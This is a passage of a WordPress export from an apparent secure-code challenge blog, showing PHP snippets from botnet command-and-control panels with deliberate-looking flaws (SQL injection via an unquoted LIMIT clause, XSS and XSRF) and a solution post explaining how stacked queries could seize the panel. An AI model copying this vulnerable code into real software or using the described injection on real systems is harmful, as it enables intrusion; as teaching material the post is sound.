		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Shape</title>
		<link>http://spotthevuln.com/2011/06/shape/</link>
		<pubDate>Mon, 27 Jun 2011 11:59:58 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1531</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I was scared I was going to have some weird shape to my head and I was pleased that I didn't.
Edward Furlong
</strong></blockquote>
<code lang="PHP">
<?php

include_once('auth.php');

set_magic_quotes_runtime(1);

if(is_readable('html.php')) include_once('html.php');
 else die('Could not find HTML library.');
 
if(is_readable('mycommon.php')) require('mycommon.php');
else die('Could not open configuration file.');

 if(is_readable('lang.php')) include_once('lang.php');
 else die('Could not find language library.');

$CTRL=1; 
if(!isset($_GET['wohead']))
 include_once('head.php');

$msg = '';
$srch = '';

...<snip>...

 if(isset($_POST['S_COMPID'])){
 $srch = search_bot();
 };
 
 
 $param =array(
 "SRCH"=>$srch,
 "LAND"=>get_land($mres),
 "TASKS"=>get_task($mres),
 "MSG"=>$msg
 );
   
 
 
   
 echo HTML_TASK_ADD($param);  

//include_once('bottom.php'); 
//Functions++++++++++++++++++++++++++



function search_bot(){
global $mres,$_POST;

if($_POST['S_COMPID'] == '')
if($_POST['S_IP'] == '')
return ''; 
	



if($_POST['S_COMPID'] > ''){
	$s_id = str_replace('*',"%",$_POST['S_COMPID']);
$q = 'SELECT * FROM `bots` WHERE `FCompID` like ("'.$s_id.'") limit '.$_POST['S_RESULTS'];
 $result = mysql_query($q,$mres);
  
 return  HTML_serch_res_tbl($result);  
};
 
	
if($_POST['S_IP'] > ''){
	
	$s_ip = str_replace('*',"%",$_POST['S_IP']);
	
 $q = 'SELECT * FROM `bots` WHERE `ip_addr` like ("'.$s_ip.'") limit '.$_POST['S_RESULTS'];
 $result = mysql_query($q,$mres);
 
  return  HTML_serch_res_tbl($result);  
};


	
};



function HTML_serch_res_tbl($result){
global $LNG;	
	
	 $nr = @mysql_num_rows($result);
if(!$nr) 
  return "<font color=#990000>Message</font>:<em> No Entries found.</em>";
	
$ret = " <br><table width=\"543\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"> "
." <tr class=\"file2\"> "
." <td colspan=\"8\" class=\"bhead\"><div align=\"center\">Select Results</div></td> "
." </tr> "
." <tr class=\"file2\"> "
." <td width=\"21\" bgcolor=#FCFCFC>Add</td> "
." <td width=\"26\" nowrap=\"nowrap\" bgcolor=#FCFCFC>Land</td> "
." <td width=\"82\" bgcolor=#FCFCFC nowrap=\"nowrap\">IP</td> "
." <td width=\"93\" bgcolor=#FCFCFC nowrap=\"nowrap\">Rep. Count total </td> "
." <td width=\"56\" bgcolor=#FCFCFC nowrap=\"nowrap\">Last Report</td> "
." <td width=\"100\" bgcolor=#FCFCFC nowrap=\"nowrap\">First Report</td> "
." <td width=\"40\" bgcolor=#FCFCFC nowrap=\"nowrap\">Bot Ver.</td> "
." <td width=\"44\" bgcolor=#FCFCFC nowrap=\"nowrap\">CompID</td> "
." </tr> ";	
	
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1531</wp:post_id>
		<wp:post_date>2011-06-27 04:59:58</wp:post_date>
		<wp:post_date_gmt>2011-06-27 11:59:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>shape</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2118</wp:comment_id>
			<wp:comment_author><![CDATA[Mafiuss]]></wp:comment_author>
			<wp:comment_author_email>the.mafiuss@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://mafiuss.pastiche.mx</wp:comment_author_url>
			<wp:comment_author_IP>201.103.114.68</wp:comment_author_IP>
			<wp:comment_date>2011-07-01 10:18:12</wp:comment_date>
			<wp:comment_date_gmt>2011-07-01 17:18:12</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[SQLI in lines 59 and 70 because $s_id and $s_ip are user controlled]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1309546437.1911";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1309540692.7032";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2119</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, Solution, SQL Injection Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/07/shape-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-07-01 12:09:46</wp:comment_date>
			<wp:comment_date_gmt>2011-07-01 19:09:46</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1309547386.578";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1310130556.737";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Shape - SQL Injection</title>
		<link>http://spotthevuln.com/2011/07/shape-sql-injection/</link>
		<pubDate>Fri, 01 Jul 2011 19:09:41 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1535</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Zunkerbot C&C

Fixed in Version: Not Patched

Issue Type: SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/06/shape/">Found Here</a>
<h1>Details</h1>
This week’s bug affects the task.php for the Zunkerbot C&C.  Looking at line 3, we see that magic quotes is set:  set_magic_quotes_runtime(1);
<br/>
Obviously, this was done by the malware author to prevent SQL injection attacks.  Assuming everything is working correctly, a rival malware author should be able to inject any quotes to break out of existing SQL statements.  Unfortunately for the Zunkerbot author, magicqoutes doesn’t cover all cases.  Take for example lines 59 and 70.  Here we see $s_id and $s_ip are enclosed in quotes.  These values should be protected against SQL injection.  $s_id and $s_ip aren’t the only variables being used in this SQL statement however.  At the end of the two SQL statements is the following LIMIT clause: limit '.$_POST['S_RESULTS']; 
<br/>
$_POST['S_RESULTS'] is NOT encapsulated within quotes, therefore the attacker is free to add their own SQL without having to use any quotes.  Magic quotes does not escape semicolon characters (;), so the attacker is free to stack SQL queries and run arbitrary SQL on the Zunkerbot C&C.  With this SQL injection vulnerability in hand, a rival botmaster could take over vulnerable Zunkerbot botnets with a single GET request.

<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="3,59,70">
<?php

include_once('auth.php');

set_magic_quotes_runtime(1);

if(is_readable('html.php')) include_once('html.php');
 else die('Could not find HTML library.');
 
if(is_readable('mycommon.php')) require('mycommon.php');
else die('Could not open configuration file.');

 if(is_readable('lang.php')) include_once('lang.php');
 else die('Could not find language library.');

$CTRL=1; 
if(!isset($_GET['wohead']))
 include_once('head.php');

$msg = '';
$srch = '';

...<snip>...

 if(isset($_POST['S_COMPID'])){
 $srch = search_bot();
 };
 
 
 $param =array(
 "SRCH"=>$srch,
 "LAND"=>get_land($mres),
 "TASKS"=>get_task($mres),
 "MSG"=>$msg
 );
   
 
 
   
 echo HTML_TASK_ADD($param);  

//include_once('bottom.php'); 
//Functions++++++++++++++++++++++++++



function search_bot(){
global $mres,$_POST;

if($_POST['S_COMPID'] == '')
if($_POST['S_IP'] == '')
return ''; 
	



if($_POST['S_COMPID'] > ''){
	$s_id = str_replace('*',"%",$_POST['S_COMPID']);
$q = 'SELECT * FROM `bots` WHERE `FCompID` like ("'.$s_id.'") limit '.$_POST['S_RESULTS'];
 $result = mysql_query($q,$mres);
  
 return  HTML_serch_res_tbl($result);  
};
 
	
if($_POST['S_IP'] > ''){
	
	$s_ip = str_replace('*',"%",$_POST['S_IP']);
	
 $q = 'SELECT * FROM `bots` WHERE `ip_addr` like ("'.$s_ip.'") limit '.$_POST['S_RESULTS'];
 $result = mysql_query($q,$mres);
 
  return  HTML_serch_res_tbl($result);  
};


	
};



function HTML_serch_res_tbl($result){
global $LNG;	
	
	 $nr = @mysql_num_rows($result);
if(!$nr) 
  return "<font color=#990000>Message</font>:<em> No Entries found.</em>";
	
$ret = " <br><table width=\"543\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"> "
." <tr class=\"file2\"> "
." <td colspan=\"8\" class=\"bhead\"><div align=\"center\">Select Results</div></td> "
." </tr> "
." <tr class=\"file2\"> "
." <td width=\"21\" bgcolor=#FCFCFC>Add</td> "
." <td width=\"26\" nowrap=\"nowrap\" bgcolor=#FCFCFC>Land</td> "
." <td width=\"82\" bgcolor=#FCFCFC nowrap=\"nowrap\">IP</td> "
." <td width=\"93\" bgcolor=#FCFCFC nowrap=\"nowrap\">Rep. Count total </td> "
." <td width=\"56\" bgcolor=#FCFCFC nowrap=\"nowrap\">Last Report</td> "
." <td width=\"100\" bgcolor=#FCFCFC nowrap=\"nowrap\">First Report</td> "
." <td width=\"40\" bgcolor=#FCFCFC nowrap=\"nowrap\">Bot Ver.</td> "
." <td width=\"44\" bgcolor=#FCFCFC nowrap=\"nowrap\">CompID</td> "
." </tr> ";		
?>
</code>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1535</wp:post_id>
		<wp:post_date>2011-07-01 12:09:41</wp:post_date>
		<wp:post_date_gmt>2011-07-01 19:09:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>shape-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Imagination</title>
		<link>http://spotthevuln.com/2011/07/imagination/</link>
		<pubDate>Mon, 04 Jul 2011 19:54:10 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1540</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I am enough of an artist to draw freely upon my imagination. Imagination is more important than knowledge. Knowledge is limited. Imagination encircles the world.
Albert Einstein
</strong></blockquote>
<code lang="PHP">
<?php if(!defined('__INDEX__'))die();
$pedt=PRIV&PRIV_BOTS_CMDS_EDIT;
if((isset($_GET['new'])&&$pedt)||(isset($_GET['edit'])&&is_numeric($_GET['edit'])))
{
  if(!@include_once('fmt.php'))die('fmt.php not founded!');
  $name=isset($_POST['name'])?$_POST['name']:time();
  $stat=isset($_POST['stat'])?($_POST['stat']?1:0):0;
  $limit=(isset($_POST['limit'])&&is_numeric($_POST['limit']))?$_POST['limit']:0;
  $cnts=isset($_POST['cnts'])?$_POST['cnts']:'';
  $cids=isset($_POST['cids'])?$_POST['cids']:'';
  $bns=isset($_POST['bns'])?$_POST['bns']:'';
  $cmds=isset($_POST['cmds'])?$_POST['cmds']:'';

  if($_SERVER['REQUEST_METHOD']=='POST'&&strlen($name)>0&&$pedt)
  {
    $cmdsb=EncodeBuffer(str_replace("\r\n","\n",trim($cmds)));
    $data='name=\''.addslashes($name).'\',stat='.$stat.',lim='.$limit.',c=\''.addslashes(SepFmt($cnts)).'\',comps=\''.addslashes(SepFmt($cids)).'\',bns=\''.addslashes(SepFmt($bns)).'\',cmds=\''.addslashes($cmdsb).'\'';
    if(isset($_GET['new']))mysql_query('INSERT INTO '.TABLE_BCMDS.' SET '.$data.',id2='.time());
    else mysql_query('UPDATE '.TABLE_BCMDS.' SET '.$data.' WHERE id=\''.$_GET['edit'].'\' LIMIT 1');
    header('Location: '.QUERY_STRING);
  }
  else
  {
    if(!$pedt&&isset($_GET['new']))unset($_GET['new']);
    HTMLBegin(isset($_GET['new'])?LNG_MBCMDS_NEWCMD:($pedt?LNG_MBCMDS_EDITCMD:LNG_MBCMDS_VIEWCMD));  
    if(isset($_GET['new']))print CmdForm('new',LNG_MBCMDS_NEWCMD,LNG_MBCMDS_ADD,$name,$stat,$limit,$cnts,$cids,$bns,$cmds);
    else
    {
      $r=mysql_query('SELECT * FROM '.TABLE_BCMDS.' WHERE id=\''.$_GET['edit'].'\' LIMIT 1');
      if($r&&mysql_affected_rows()==1&&($m=mysql_fetch_assoc($r)))print CmdForm('edit='.$_GET['edit'],$pedt?LNG_MBCMDS_EDITCMD:LNG_MBCMDS_VIEWCMD,$pedt?LNG_MBCMDS_EDIT:'',$m['name'],$m['stat'],$m['lim'],SepFmtB($m['c']),SepFmtB($m['comps']),SepFmtB($m['bns']),DecodeBuffer($m['cmds']));
      else print '<font class="error">'.LNG_MBCMDS_ERROR_1.'</font>';
    }
    HTMLEnd();
  }
  die();
}
else if(isset($_GET['del'])&&is_numeric($_GET['del'])&&$pedt)
{
  mysql_query('DELETE FROM  '.TABLE_BCMDS.' WHERE id='.$_GET['del'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();  
}
else if(isset($_GET['res'])&&is_numeric($_GET['res'])&&$pedt)
{
  mysql_query('UPDATE '.TABLE_BCMDS.' SET exc=\'0\',rcomps=\'\',exct=\'0\' WHERE id='.$_GET['res'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();
}

HTMLBegin(LNG_MBCMDS,$pedt?'function DelCmd(uid,q){if(confirm(q))window.location=\''.QUERY_STRING.'&del=\'+uid;};function ResCmd(uid,q){if(confirm(q))window.location=\''.QUERY_STRING.'&res=\'+uid;}':'');

$r=mysql_query('SELECT * FROM '.TABLE_BCMDS);      
$total=mysql_affected_rows();
print '<table class="tbl1"><tr><td class="td1" colspan="'.($pedt?9:10).'">'.LNG_MBCMDS_R_CMDS.'&nbsp;('.$total.')</td>';
if($pedt)print '<td class="td1" align="center"><input type="submit" value="'.LNG_MBCMDS_NEWCMD.'" class="ism" style="width:100%" onClick="window.location=\''.QUERY_STRING.'&new\';"></td>';
print '</tr><tr><td class="td1">'.LNG_MBCMDS_R_ID.'</td><td class="td1">'.LNG_MBCMDS_R_NAME.'</td><td class="td1">'.LNG_MBCMDS_R_STAT.'</td><td class="td1">'.LNG_MBCMDS_R_LIMIT.'</td><td class="td1">'.LNG_MBCMDS_R_REQ.'</td><td class="td1">'.LNG_MBCMDS_R_EXEC.'</td><td class="td1">'.LNG_MBCMDS_R_CNTS.'</td><td class="td1">'.LNG_MBCMDS_R_CIDS.'</td><td class="td1">'.LNG_MBCMDS_R_BNS.'</td><td class="td1">&nbsp;</td></tr>';
if($total>0)
{
  $j=0;
  while(($m=mysql_fetch_assoc($r)))
  {
    $a=(($j++)%2==0?1:2);
    print '<tr valign="top"><td align="right" class="tdx'.$a.'">'.$m['id2'].'</td>'.
          '<td class="tdx'.$a.'">'.htmlentities($m['name']).'</td>'.
          '<td class="tdx'.$a.'">'.($m['stat']?LNG_MBCMDS_STAT_ON:LNG_MBCMDS_STAT_OFF).'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['lim'].'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['exc'].'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['exct'].'</td>'.
          '<td class="tdx'.$a.'">'.($m['c']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['c'])))).'</td>'.
          '<td class="tdx'.$a.'">'.($m['comps']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['comps'])))).'</td>'.
          '<td class="tdx'.$a.'">'.($m['bns']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['bns'])))).'</td>'.
          '<td class="tdx'.$a.'" align="center"><input class="ism" style="width:90%" type="submit" value="'.($pedt?LNG_MBCMDS_R_EDIT:LNG_MBCMDS_R_VIEW).'" onClick="window.location=\''.QUERY_STRING.'&edit='.$m['id'].'\';return false;">';
    if($pedt)print '<br><input class="ism" style="width:90%" type="submit" value="'.LNG_MBCMDS_R_RES_OK.'" onClick="javascript:ResCmd(\''.$m['id'].'\',\''.addslashes(sprintf(LNG_MBCMDS_R_RES,$m['name'])).'\');return false;"><br><input class="ism" style="width:90%" type="submit" value="'.LNG_MBCMDS_R_DEL_OK.'" onClick="javascript:DelCmd(\''.$m['id'].'\',\''.addslashes(sprintf(LNG_MBCMDS_R_DEL,$m['name'])).'\');return false;">';
    print '</td></tr>';
  }
}
else print '<tr><td align="center" colspan="10" class="tdx1"><i>'.LNG_MBCMDS_R_NONE.'</i></td></tr>';
print '</table>';
HTMLEnd();

function CmdForm($cmd,$title,$action,$name,$stat,$limit,$cnts,$cids,$bns,$cmds)
{
  $en=$action==''?0:1;
  $stat=$stat?1:0;
  $ro=$en?'':'readonly ';
  
  $str=$en?'<form method="POST" action="'.QUERY_STRING.'&'.$cmd.'">':'';
  $str.='<table class="tbl1" width="350"><tr><td class="td1" colspan="2">'.$title.'</td></tr>'.
        '<tr><td>'.LNG_MBCMDS_NAME.'</td><td width="100%"><input '.$ro.'type="text" name="name" value="'.htmlentities($name).'" style="width:100%"></td></tr>'.
        '<tr><td colspan="2"><table class="tbl1"><tr><td>'.LNG_MBCMDS_STAT.'</td><td width="100%"><select '.($en?'':'disabled ').'name="stat" style="width:100%">'.
        '<option value="1"'.($stat==1?' selected':'').'>'.LNG_MBCMDS_STAT_ON.'</option>'.
        '<option value="0"'.($stat==0?' selected':'').'>'.LNG_MBCMDS_STAT_OFF.'</option>'.
        '</select></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_LIMIT.'</td><td width="100%"><input '.$ro.'type="text" name="limit" value="'.$limit.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_CNTS.'</td><td width="100%"><input '.$ro.'type="text" name="cnts" value="'.$cnts.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_CIDS.'</td><td width="100%"><input '.$ro.'type="text" name="cids" value="'.$cids.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_BNS.'</td><td width="100%"><input '.$ro.'type="text" name="bns" value="'.$bns.'" style="width:100%"></td></tr>'.
        '<tr><td valign="top">'.LNG_MBCMDS_CMDS.'</td><td><textarea wrap="off" '.$ro.'name="cmds" style="width:100%;height:100">'.htmlentities($cmds).'</textarea></td></tr>'.
        '</table></tr></td><tr><td colspan="2" align="right">';
  if($en)$str.='<input type="submit" class="ism" value="'.$action.'" style="width:100">&nbsp;';
  $str.='<input type="submit" class="ism" value="'.LNG_MBCMDS_BACK.'" style="width:100" onClick="window.location.href=\''.QUERY_STRING.'\';return false;"></td></tr>';
  if($en)$str.='</form>';
  return $str.'</table>';
}
function SepFmt($str){if(strlen($str)>1){$str=str_replace(',','|',trim($str));if($str[0]!='|')$str='|'.$str;if($str[strlen($str)-1]!='|')$str.='|';}return $str;}
function SepFmtB($str){if(strlen($str)>1){$str=str_replace('|',',',trim($str));if($str[0]==',')$str=substr($str,1);$l=strlen($str);if($str[$l-1]==',')$str=substr($str,0,$l-1);}return $str;}
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1540</wp:post_id>
		<wp:post_date>2011-07-04 12:54:10</wp:post_date>
		<wp:post_date_gmt>2011-07-04 19:54:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>imagination</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2121</wp:comment_id>
			<wp:comment_author><![CDATA[Cross Site Request Forgery (XSRF), Cross-Site Scripting (XSS), PHP, Solution Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/07/imagination-xss-and-xsrf/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-07-08 06:20:36</wp:comment_date>
			<wp:comment_date_gmt>2011-07-08 13:20:36</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1310131236.948";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310344302.4607";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2122</wp:comment_id>
			<wp:comment_author><![CDATA[Ryan]]></wp:comment_author>
			<wp:comment_author_email>ryan@megahits.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>204.60.84.2</wp:comment_author_IP>
			<wp:comment_date>2011-07-08 06:35:55</wp:comment_date>
			<wp:comment_date_gmt>2011-07-08 13:35:55</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[The code is the vulnerability in and of itself... holy crap someone teach this dude some formatting principles (not really my answer, I didn't analyze the code, just making a point).]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310344298.0635";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310132155.4876";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2160</wp:comment_id>
			<wp:comment_author><![CDATA[Helping Developers Understand Security | National Cyber Security]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://nationalcybersecurity.mobi/helping-developers-understand-security/</wp:comment_author_url>
			<wp:comment_author_IP>50.57.119.215</wp:comment_author_IP>
			<wp:comment_date>2011-08-17 08:39:31</wp:comment_date>
			<wp:comment_date_gmt>2011-08-17 15:39:31</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] What about including these weekly challenges in your software security program, so that developers, development managers, and QA staff can test their source code analysis skills and enjoy security by solving them? This week challenge is about&#8230; Imagination. [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1313595571.4636";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1319567551.9797";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Imagination - XSS and XSRF</title>
		<link>http://spotthevuln.com/2011/07/imagination-xss-and-xsrf/</link>
		<pubDate>Fri, 08 Jul 2011 13:20:30 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1543</guid>
		<description></description>
